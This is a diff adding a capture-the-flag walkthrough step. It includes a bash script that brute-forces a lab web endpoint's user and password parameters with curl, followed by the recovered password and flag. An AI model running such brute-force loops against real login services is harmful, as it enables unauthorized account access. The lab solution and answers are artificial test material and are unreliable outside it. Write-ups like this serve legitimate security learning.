@@ -1299,9 +1299,66 @@ I used getty with the option -f to precise the issue file. I also mixed it with 
     ## ES ##
     Si damos un usuario (user) y password (password) en http://localhost/request.php puede que phoebe nos de su password.
 
+I used `find` to search for anyhting intersting. And I found that some users before me created two files : user.txt and pass.txt. They contain a list of previous owned users and their corresponding passwords. So basically they tried to bruteforcing.
+
+![image](./assets/level47_p.jpg)
+
+![image](./assets/level47_pp.jpg)
+
+I use this baah script to bruteforce the the user and pass. What it does is just lopping over the list of passwords and usernames if the web app returns anything rather than "NOTHING" we test if that password already in the pass.txt if not that's our potentail password.
+
+```bash
+#!/bin/bash
+
+while read -r user; do
+    while read -r pass; do
+
+        response=$(curl -s "http://localhost/request.php?user=$user&password=$pass" | grep -v '^$')
+
+        # If the response does not contain "NOTHING"
+        if [[ "$response" != *"NOTHING"* ]]; then
+
+            # Check if response exists exactly in pass.txt
+            if ! grep -qxF "$response" pass.txt; then
+                echo "$response"
+                echo "$user : $pass"
+                exit 0
+            fi
+        fi
+
+    done < pass.txt
+done < user.txt
+
+
+```
+
+![image](./assets/level47_pass.jpg)
+
+I keep testing these passowrds until I found the right one.
+
+| user | password | flag
+|------|----------|-----
+|phoebe|FPLwKmmKhcWAwRxiaBDN|^CrsphcuWGgjhlBYXhzQ^
+
+# Mission 48
+
+    ################
+    # MISSION 0x48 #
+    ################
+    
+    ## EN ##
+    User rhea likes pictures.
+    
+    ## ES ##
+    A la usuaria rhea le gustan las imagenes.
+
+
+
+
 
     
     
+
 
 
 
